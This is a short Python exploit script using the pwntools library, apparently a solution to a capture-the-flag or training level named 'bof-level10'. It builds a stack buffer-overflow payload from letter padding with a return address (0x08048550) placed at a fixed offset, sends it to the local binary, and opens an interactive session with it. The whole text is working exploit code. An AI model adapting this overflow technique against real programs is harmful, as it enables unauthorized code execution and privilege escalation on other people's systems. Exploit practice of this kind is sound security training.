#!/usr/bin/env python
from pwn import *

######################################################
padding = 'aaaa'

for letter in 'bcdefg':
  padding += letter*4

padding += '\x50\x85\x04\x08'

for letter in 'ijklmnopqrstuvwxyzABCDE':
  padding += letter*4

payload = padding
######################################################

context.terminal = ['tmux', 'splitw'] 

target = process('./bof-level10')
#target = process('./bof-level10', setuid=False)
#gdb.attach(target, f'b *main')

target.recv()

target.send(payload) 

target.interactive()
